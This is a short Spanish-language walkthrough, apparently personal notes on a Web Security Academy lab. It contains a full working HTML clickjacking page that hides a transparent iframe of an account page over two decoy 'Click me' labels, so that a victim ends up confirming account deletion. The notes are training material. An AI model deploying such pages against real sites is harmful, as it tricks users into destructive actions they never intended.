
## Objetivo:

![[Pasted image 20240609213836.png]]

## Solucion:

Iniciar sesion con nuestra cuenta.

Vemos que la funcionalidad de eliminar cuenta ahora contiene un cuadro de confirmacion...

![[Pasted image 20240609213928.png]]

![[Pasted image 20240609213936.png]]


Intentaremos crear un "exploit" para que la victima tenga que pulsar en esos lugares de alguna manera...

El exploit se veria de la siguiente manera:

```
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

<style>

iframe {

width: 1000px;

height: 700px;

position: relative;

z-index: 2;

opacity: 0.3;

}

  

.first, .next {

position: absolute;

z-index: 1;

}

  

.first {

top: 515px;

left: 45px;

}

  
  

.next {

top: 315px;

left: 200px;

  

}

</style>

  

</head>

<body>

  

<div class="first">Click me first</div>

<div class="next">Click me next</div>

<iframe src="https://0aaa004c03bea19b829d88c900e300dc.web-security-academy.net/my-account"></iframe>

</body>

</html>
```

![[Pasted image 20240609214426.png]]

![[Pasted image 20240609214435.png]]

Ahora mas de lo mismo, cambiar el opacity del iframe a 0.000001, guardar y enviar a la victima...

![[Pasted image 20240609214530.png]]

